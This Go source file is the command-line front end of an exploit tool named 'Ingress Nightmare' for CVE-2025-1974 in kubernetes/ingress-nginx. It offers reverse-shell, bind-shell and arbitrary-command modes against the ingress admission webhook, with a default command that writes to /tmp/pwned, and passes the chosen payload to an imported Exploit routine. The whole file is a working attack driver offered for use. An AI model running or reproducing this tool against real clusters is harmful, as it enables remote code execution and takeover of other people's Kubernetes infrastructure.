package main

import (
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
	nginx_ingress "ingressnightmare/nginx-ingress"
	"net"
	"os"
	"strings"
)

var Opts = struct {
	Mode              string
	IngressWebhookUrl string
	UploadUrl         string
	Verbose           int
	DryRun            bool

	ReverseShellIp   net.IP
	ReverseShellPort uint16

	BindShellPort uint16

	Command string
}{}

func defaultPodIp() net.IP {
	interfaces, _ := net.Interfaces()
	for _, i := range interfaces {
		if i.Name == "eth0" {
			addrs, _ := i.Addrs()
			if addrs != nil || len(addrs) > 0 {
				ip := strings.Split(addrs[0].String(), "/")[0]
				return net.ParseIP(ip)
			}
		}
	}
	return net.ParseIP("10.0.0.1")
}

func init() {
	ExpCmd.Flags().StringVarP(&Opts.Mode, "mode", "m", "", "mode reverse-shell(r)/bind-shell(b)/command(c)")
	_ = ExpCmd.MarkFlagRequired("mode")
	ExpCmd.Flags().StringVarP(&Opts.IngressWebhookUrl, "ingress-webhook-url", "i",
		"https://ingress-nginx-controller-admission.ingress-nginx.svc.cluster.local:443",
		"ingress webhook url")
	ExpCmd.Flags().StringVarP(&Opts.UploadUrl, "upload-url", "u",
		"http://ingress-nginx-controller.ingress-nginx.svc.cluster.local:80",
		"upload url")

	ExpCmd.Flags().IPVarP(&Opts.ReverseShellIp, "reverse-shell-ip", "r", defaultPodIp(), "reverse shell ip")
	ExpCmd.Flags().Uint16VarP(&Opts.ReverseShellPort, "reverse-shell-port", "p", 0, "reverse shell port")
	ExpCmd.Flags().Uint16VarP(&Opts.BindShellPort, "bind-shell-port", "b", 0, "bind shell port")
	ExpCmd.Flags().StringVarP(&Opts.Command, "command", "c", "", "command")

	ExpCmd.PersistentFlags().CountVarP(&Opts.Verbose, "verbose", "v", "verbose output")
	ExpCmd.PersistentFlags().BoolVarP(&Opts.DryRun, "dry-run", "d", false, "dry run")
}

var ExpCmd = &cobra.Command{
	Use:   "ingress-nightmare",
	Short: "Ingress Nightmare is a tool to exploit kubernetes/ingress-nginx",
	Long: "Ingress Nightmare is a tool to exploit kubernetes/ingress-nginx, Thanks to Wiz amazing research." +
		" CVE-2025-1974, https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities#how-did-we-discover-ingressnightmare-24",
	PersistentPreRun: func(cmd *cobra.Command, args []string) {
		logLevel := log.InfoLevel
		if Opts.Verbose >= 2 {
			logLevel = log.TraceLevel
			nginx_ingress.Verbose = true
		} else if Opts.Verbose == 1 {
			logLevel = log.DebugLevel
		}
		log.SetLevel(logLevel)
		log.SetOutput(os.Stdout)
	},
	Run: func(cmd *cobra.Command, args []string) {
		var payload nginx_ingress.Payload
		switch Opts.Mode {
		case "reverse-shell", "r":
			ip := ""
			for _, part := range strings.Split(Opts.ReverseShellIp.String(), ".") {
				if len(part) == 1 {
					part = "00" + part
				} else if len(part) == 2 {
					part = "0" + part
				}
				ip += part
			}
			payload = nginx_ingress.NewReverseShellPayload(Opts.ReverseShellIp.String(), fmt.Sprintf("%d", Opts.ReverseShellPort))
		case "bind-shell", "b":
			payload = nginx_ingress.NewBindShellPayload(fmt.Sprintf("%d", Opts.BindShellPort))
		case "command", "c":
			payload = nginx_ingress.NewCommandPayload(Opts.Command)
		default:
			payload = nginx_ingress.NewCommandPayload("id > /tmp/pwned")
		}
		if Opts.DryRun {
			log.Infoln("dry-run mode, payload:")
			fmt.Println(string(payload))
			return
		}
		log.Tracef("mode chosen: %s", Opts.Mode)
		nginx_ingress.Exploit(Opts.IngressWebhookUrl, Opts.UploadUrl, payload)
	},
}

func main() {

	if err := ExpCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
